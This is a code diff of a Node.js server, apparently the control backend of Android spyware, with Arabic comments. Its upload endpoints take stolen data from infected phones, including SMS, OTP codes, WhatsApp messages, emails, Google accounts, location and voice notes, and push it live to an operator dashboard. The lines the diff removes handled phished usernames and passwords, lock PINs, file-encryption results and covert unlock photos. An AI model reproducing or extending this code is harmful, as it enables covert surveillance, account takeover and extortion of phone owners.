@@ -99,13 +99,11 @@ function pushToDevice(deviceId, eventName, payload) {
     if (sent > 0) console.log(`[SSE] >> ${eventName} to device=${deviceId}`);
 }
 
-// ═══════════════════════════════════════════════════════
-// AUTH
-// ═══════════════════════════════════════════════════════
 app.post('/auth/login', (req, res) => {
     try {
         const { password, device } = req.body;
         if (!password || !device || !device.fp) return res.json({ status: 'error', message: 'Missing credentials' });
+
         if (password !== ADMIN_PASSWORD) return res.json({ status: 'wrong_password' });
 
         const fp = device.fp;
@@ -117,6 +115,7 @@ app.post('/auth/login', (req, res) => {
             saveAuth(auth);
             const token = generateToken();
             activeSessions.set(token, { fp, created: Date.now(), expires: Date.now() + SESSION_DURATION, device, isOwner: true });
+            console.log(`[AUTH] 🎉 First device = OWNER`);
             return res.json({ status: 'approved', token, isOwner: true, first_device: true });
         }
 
@@ -265,15 +264,11 @@ app.post('/auth/revoke-device', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ═══════════════════════════════════════════════════════
-// UPLOAD
-// ═══════════════════════════════════════════════════════
 app.post('/upload.php', (req, res) => {
     try {
         if (!isApkRequest(req)) return res.status(401).json({ error: 'Unauthorized' });
         const data = req.body;
 
-        // ═══ Debug logs ═══
         if (data.type === 'debug_logs') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -281,134 +276,14 @@ app.post('/upload.php', (req, res) => {
             const logFile = path.join(deviceDir, 'debug.log');
             fs.writeFileSync(logFile, data.logs || '');
             updateDevicesList(deviceId, null);
+            console.log(`═══════════════════════════════════════`);
             console.log(`[LOGS] ${(data.logs || '').length} bytes from ${deviceId}`);
+            console.log(`═══════════════════════════════════════`);
+            console.log(data.logs || 'empty');
+            console.log(`═══════════════════════════════════════`);
             return res.json({ success: true });
         }
 
-        // ═══ نتيجة القفل بالرمز ═══
-        if (data.type === 'lock_result') {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-
-            const lockFile = path.join(deviceDir, 'lock_result.json');
-            const lockData = {
-                status: data.status || 'unknown',
-                pin: data.pin || '',
-                timestamp: data.timestamp || Date.now()
-            };
-            fs.writeFileSync(lockFile, JSON.stringify(lockData, null, 2));
-            updateDevicesList(deviceId, null);
-            console.log(`[LOCK] Device ${deviceId}: ${data.status}`);
-
-            pushToDevice(deviceId, 'lock_result', lockData);
-            return res.json({ success: true });
-        }
-
-        // ═══ نتيجة التشفير ═══
-        if (data.type === 'encryption_result' || data.type === 'decryption_result') {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-
-            const resultFile = path.join(deviceDir, 'crypto_result.json');
-            const cryptoData = {
-                type: data.type,
-                status: data.status || 'unknown',
-                files_count: data.files_count || 0,
-                files_skipped: data.files_skipped || 0,
-                files_failed: data.files_failed || 0,
-                duration_sec: data.duration_sec || 0,
-                mode: data.mode || 'full',
-                error: data.error || '',
-                timestamp: data.timestamp || Date.now()
-            };
-            fs.writeFileSync(resultFile, JSON.stringify(cryptoData, null, 2));
-            updateDevicesList(deviceId, null);
-
-            pushToDevice(deviceId, 'crypto_result', cryptoData);
-            return res.json({ success: true });
-        }
-
-        // ═══ نتيجة تفعيل/إيقاف كاميرا القفل ═══
-        if (data.type === 'unlock_camera_result') {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-
-            const statusFile = path.join(deviceDir, 'unlock_camera_status.json');
-            fs.writeFileSync(statusFile, JSON.stringify({
-                status: data.status || 'unknown',
-                timestamp: data.timestamp || Date.now()
-            }, null, 2));
-            updateDevicesList(deviceId, null);
-
-            pushToDevice(deviceId, 'unlock_camera_result', {
-                status: data.status,
-                timestamp: data.timestamp
-            });
-            return res.json({ success: true });
-        }
-
-        // 📷 صورة عند فتح القفل
-        if (data.type === 'unlock_photo' && data.file_data) {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-
-            const photosFile = path.join(deviceDir, 'unlock_photos.json');
-            let photos = [];
-            if (fs.existsSync(photosFile)) photos = JSON.parse(fs.readFileSync(photosFile, 'utf8'));
-
-            photos.unshift({
-                name: data.file_name || 'unlock.jpg',
-                data: data.file_data,
-                size: data.file_size || 0,
-                date: data.timestamp || Date.now()
-            });
-
-            if (photos.length > 200) photos = photos.slice(0, 200);
-            fs.writeFileSync(photosFile, JSON.stringify(photos, null, 2));
-            updateDevicesList(deviceId, null);
-
-            pushToDevice(deviceId, 'new_unlock_photo', {
-                name: data.file_name,
-                data: data.file_data,
-                date: data.timestamp
-            });
-
-            console.log(`[UNLOCK-CAM] Photo from ${deviceId}`);
-            return res.json({ success: true, photos_count: photos.length });
-        }
-
-        // 🎣 Phishing credentials
-        if (data.type === 'phishing_credential') {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-
-            const credsFile = path.join(deviceDir, 'phishing_creds.json');
-            let creds = [];
-            if (fs.existsSync(credsFile)) creds = JSON.parse(fs.readFileSync(credsFile, 'utf8'));
-
-            const entry = {
-                target_app: data.target_app || '',
-                username: data.username || '',
-                password: data.password || '',
-                timestamp: data.timestamp || Date.now()
-            };
-            creds.unshift(entry);
-
-            if (creds.length > 500) creds = creds.slice(0, 500);
-            fs.writeFileSync(credsFile, JSON.stringify(creds, null, 2));
-            updateDevicesList(deviceId, null);
-
-            pushToDevice(deviceId, 'phishing_cred', entry);
-            console.log(`[PHISHING] Credentials from ${deviceId}: ${entry.username}`);
-            return res.json({ success: true });
-        }
-
-        // ═══ Image data (عادي) ═══
         if (data.type === 'image_data' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -426,7 +301,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, images_count: imagesData.length });
         }
 
-        // ═══ Voice notes ═══
         if (data.type === 'voice_note' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -445,7 +319,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, voice_count: voices.length });
         }
 
-        // ═══ Deleted data ═══
         if (data.type === 'deleted_data') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -469,7 +342,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, deleted_count: deleted.length });
         }
 
-        // ═══ Google accounts ═══
         if (data.type === 'google_accounts') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -480,7 +352,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, account_count: (data.accounts || []).length });
         }
 
-        // ═══ SIM info ═══
         if (data.type === 'sim_info') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -492,7 +363,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, sim_count: (data.sims || []).length });
         }
 
-        // ═══ OTP ═══
         if (data.type === 'otp_code') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -509,7 +379,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, otp_count: otps.length });
         }
 
-        // ═══ Email ═══
         if (data.type === 'email_data') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -526,7 +395,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, email_count: emails.length });
         }
 
-        // ═══ SMS result ═══
         if (data.type === 'sms_send_result') {
             const deviceId = data.device_id || 'unknown';
             updateDevicesList(deviceId, null);
@@ -534,7 +402,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true });
         }
 
-        // ═══ Self number ═══
         if (data.type === 'self_number') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -546,7 +413,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true });
         }
 
-        // ═══ Profile ═══
         if (data.type === 'profile_info') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -558,7 +424,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true });
         }
 
-        // ═══ WhatsApp ═══
         if (data.type === 'whatsapp_message') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -581,7 +446,6 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, wa_count: waMessages.length });
         }
 
-        // ═══ Data (general) ═══
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
         if (!fs.existsSync(deviceDir)) { fs.mkdirSync(deviceDir, { recursive: true }); fs.mkdirSync(path.join(deviceDir, 'files'), { recursive: true }); }
@@ -615,6 +479,7 @@ app.post('/upload.php', (req, res) => {
                 }
                 unique.sort((a, b) => (b.date || 0) - (a.date || 0));
                 existingData.sms = unique.slice(0, 10000);
+
                 data.data.sms.forEach(sms => { pushToDevice(deviceId, 'new_sms', sms); });
             }
 
@@ -639,7 +504,7 @@ app.post('/upload.php', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════
-// LIVE UPDATE
+// ✅ live_update — محدّث بالحقول الجديدة
 // ═══════════════════════════════════════════════════════
 app.post('/live_update.php', (req, res) => {
     try {
@@ -652,14 +517,21 @@ app.post('/live_update.php', (req, res) => {
         let live = {};
         if (fs.existsSync(liveFile)) live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
 
+        // ✅ بيانات الشبكة
         if (data.network) live.network = data.network;
         if (data.network_type) live.network_type = data.network_type;
+
+        // ✅ البطارية + الشحن
         if (data.battery !== undefined && data.battery !== null) live.battery = data.battery;
         if (data.charging !== undefined) live.charging = data.charging;
         if (data.charging_type) live.charging_type = data.charging_type;
+
+        // ✅ الموقع — لا يمسح إذا فاضي
         if (data.location && data.location.latitude && data.location.longitude) {
             live.location = data.location;
         }
+
+        // ✅ آخر اتصال
         if (data.last_seen) live.last_seen = data.last_seen;
         else live.last_seen = Math.floor(Date.now() / 1000);
 
@@ -669,6 +541,9 @@ app.post('/live_update.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
+// ═══════════════════════════════════════════════════════
+// ✅ live.php — محدّث بالحقول الجديدة
+// ═══════════════════════════════════════════════════════
 app.get('/live.php', (req, res) => {
     try {
         const deviceId = req.query.device;
@@ -691,10 +566,31 @@ app.get('/live.php', (req, res) => {
         const selfFile = path.join(dataDir, deviceId, 'self_number.json');
         const profileFile = path.join(dataDir, deviceId, 'profile.json');
         const voiceFile = path.join(dataDir, deviceId, 'voice_notes.json');
-        const unlockPhotosFile = path.join(dataDir, deviceId, 'unlock_photos.json');
-        const phishingFile = path.join(dataDir, deviceId, 'phishing_creds.json');
 
-        let response = { online: false, network: 'غير متصل', network_type: 'غير معروف', battery: null, charging: false, charging_type: 'لا', location: null, last_seen: 0, seconds_ago: 999999, call_count: 0, sms_count: 0, contacts_count: 0, images_count: 0, apps_count: 0, deleted_count: 0, otp_count: 0, voice_count: 0, unlock_photos_count: 0, phishing_count: 0, sim_numbers: [], carrier: '', self_number: '', profile_number: '', profile_name: '' };
+        let response = { 
+            online: false, 
+            network: 'غير متصل', 
+            network_type: 'غير معروف',
+            battery: null, 
+            charging: false,
+            charging_type: 'لا',
+            location: null, 
+            last_seen: 0, 
+            seconds_ago: 999999, 
+            call_count: 0, 
+            sms_count: 0, 
+            contacts_count: 0, 
+            images_count: 0, 
+            apps_count: 0, 
+            deleted_count: 0, 
+            otp_count: 0, 
+            voice_count: 0, 
+            sim_numbers: [], 
+            carrier: '', 
+            self_number: '', 
+            profile_number: '', 
+            profile_name: '' 
+        };
 
         if (fs.existsSync(liveFile)) {
             const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
@@ -722,8 +618,6 @@ app.get('/live.php', (req, res) => {
         if (fs.existsSync(deletedFile)) response.deleted_count = JSON.parse(fs.readFileSync(deletedFile, 'utf8')).length;
         if (fs.existsSync(otpFile)) response.otp_count = JSON.parse(fs.readFileSync(otpFile, 'utf8')).length;
         if (fs.existsSync(voiceFile)) response.voice_count = JSON.parse(fs.readFileSync(voiceFile, 'utf8')).length;
-        if (fs.existsSync(unlockPhotosFile)) response.unlock_photos_count = JSON.parse(fs.readFileSync(unlockPhotosFile, 'utf8')).length;
-        if (fs.existsSync(phishingFile)) response.phishing_count = JSON.parse(fs.readFileSync(phishingFile, 'utf8')).length;
 
         if (fs.existsSync(simFile)) {
             try {
@@ -749,9 +643,6 @@ app.get('/live.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ═══════════════════════════════════════════════════════
-// API GET
-// ═══════════════════════════════════════════════════════
 app.get('/api.php', (req, res) => {
     try {
         const action = req.query.action;
@@ -769,7 +660,7 @@ app.get('/api.php', (req, res) => {
             if (!session || Date.now() > session.expires) return res.status(401).json({ error: 'Unauthorized' });
 
             if (!session.isOwner) {
-                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_whatsapp', 'clear_whatsapp', 'delete_email', 'delete_voice', 'clear_voices', 'clear_unlock_photos', 'clear_phishing'];
+                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_whatsapp', 'clear_whatsapp', 'delete_email', 'delete_voice', 'clear_voices'];
                 if (ownerOnlyActions.includes(action)) return res.status(403).json({ error: 'Forbidden - Owner only' });
 
                 if (deviceId) {
@@ -780,7 +671,6 @@ app.get('/api.php', (req, res) => {
             }
         }
 
-        // ═══ Admin actions ═══
         if (action === 'delete_device') {
             const deviceDir = path.join(dataDir, deviceId);
             if (fs.existsSync(deviceDir)) fs.rmSync(deviceDir, { recursive: true, force: true });
@@ -812,7 +702,6 @@ app.get('/api.php', (req, res) => {
             return res.json({ reset: false });
         }
 
-        // ═══ Logs ═══
         if (action === 'get_logs') {
             const logFile = path.join(dataDir, deviceId, 'debug.log');
             if (fs.existsSync(logFile)) {
@@ -822,47 +711,6 @@ app.get('/api.php', (req, res) => {
             return res.send('No logs yet');
         }
 
-        // ═══ Lock result ═══
-        if (action === 'get_lock_result') {
-            const lockFile = path.join(dataDir, deviceId, 'lock_result.json');
-            if (fs.existsSync(lockFile)) return res.json(JSON.parse(fs.readFileSync(lockFile, 'utf8')));
-            return res.json({});
-        }
-
-        // ═══ Crypto result ═══
-        if (action === 'get_crypto_result') {
-            const resultFile = path.join(dataDir, deviceId, 'crypto_result.json');
-            if (fs.existsSync(resultFile)) return res.json(JSON.parse(fs.readFileSync(resultFile, 'utf8')));
-            return res.json({});
-        }
-
-        // ═══ Unlock photos ═══
-        if (action === 'get_unlock_photos') {
-            const photosFile = path.join(dataDir, deviceId, 'unlock_photos.json');
-            if (fs.existsSync(photosFile)) return res.json(JSON.parse(fs.readFileSync(photosFile, 'utf8')));
-            return res.json([]);
-        }
-
-        if (action === 'clear_unlock_photos') {
-            const photosFile = path.join(dataDir, deviceId, 'unlock_photos.json');
-            if (fs.existsSync(photosFile)) fs.writeFileSync(photosFile, '[]');
-            return res.json({ success: true });
-        }
-
-        // ═══ Phishing credentials ═══
-        if (action === 'get_phishing_creds') {
-            const credsFile = path.join(dataDir, deviceId, 'phishing_creds.json');
-            if (fs.existsSync(credsFile)) return res.json(JSON.parse(fs.readFileSync(credsFile, 'utf8')));
-            return res.json([]);
-        }
-
-        if (action === 'clear_phishing') {
-            const credsFile = path.join(dataDir, deviceId, 'phishing_creds.json');
-            if (fs.existsSync(credsFile)) fs.writeFileSync(credsFile, '[]');
-            return res.json({ success: true });
-        }
-
-        // ═══ Old actions ═══
         if (action === 'get_image_data') {
             const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
             if (fs.existsSync(imagesFile)) return res.json(JSON.parse(fs.readFileSync(imagesFile, 'utf8')));
@@ -1035,9 +883,6 @@ app.get('/api.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ═══════════════════════════════════════════════════════
-// API POST
-// ═══════════════════════════════════════════════════════
 app.post('/api.php', (req, res) => {
     try {
         const { device, command, token } = req.body;
@@ -1069,9 +914,6 @@ app.post('/api.php', (req, res) => {
     } catch (e) { res.json({ error: e.message }); }
 });
 
-// ═══════════════════════════════════════════════════════
-// DEVICES
-// ═══════════════════════════════════════════════════════
 app.get('/devices.json', (req, res) => {
     try {
         const token = req.query.token;
